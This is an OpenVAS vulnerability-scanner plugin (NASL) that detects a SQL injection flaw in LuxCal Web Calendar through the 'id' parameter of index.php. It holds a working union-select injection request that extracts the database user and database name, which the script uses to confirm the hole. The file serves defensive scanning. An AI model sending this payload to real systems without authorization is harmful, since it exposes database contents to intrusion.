##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_luxcal_web_calendar_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# LuxCal Web Calendar SQL Injection Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code.
  Impact Level: Application.";
tag_affected = "LuxCal Web Calendar version 2.4.2 to 2.5.0";
tag_insight = "The flaw is due to input passed via the 'id' parameter to 'index.php',
  which is not properly sanitised before being used in a SQL query.";
tag_solution = "No solution or patch is available as of 11th July 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.luxsoft.eu/";
tag_summary = "This host is running LuxCal Web Calendar and is prone to SQL
  injection vulnerability.";

if(description)
{
  script_id(802307);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("LuxCal Web Calendar SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/73664");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45152");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17500/");

  script_description(desc);
  script_summary("Check if LuxCal Web Calendar is vulnerable for SQL Injection attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get the port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir(make_list("/luxcal", "/cal", "/", cgi_dirs()))
{
  ## Construct the request
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if(egrep(pattern:"LuxCal Web Calendar", string:rcvRes))
  {
    ## Construct the exploit request
    exploit = string("/index.php?xP=11&id=-326415+union+all+select+1,2,",
                     "0x4f70656e564153,user(),5,database(),7,8,9,10,11,12,13,",
                     "14,15,16,17,18,19,20,21,22,23,24,25,26,27--");

    sndReq = http_get(item:string(dir, exploit), port:port);
    rcvRes = http_send_recv(port:port, data:sndReq);

    ## Check the source code of the function in response
    if(">Title:<" >< rcvRes && ">OpenVAS<" >< rcvRes)
    {
      security_hole(port);
      exit(0);
    }
  }
}
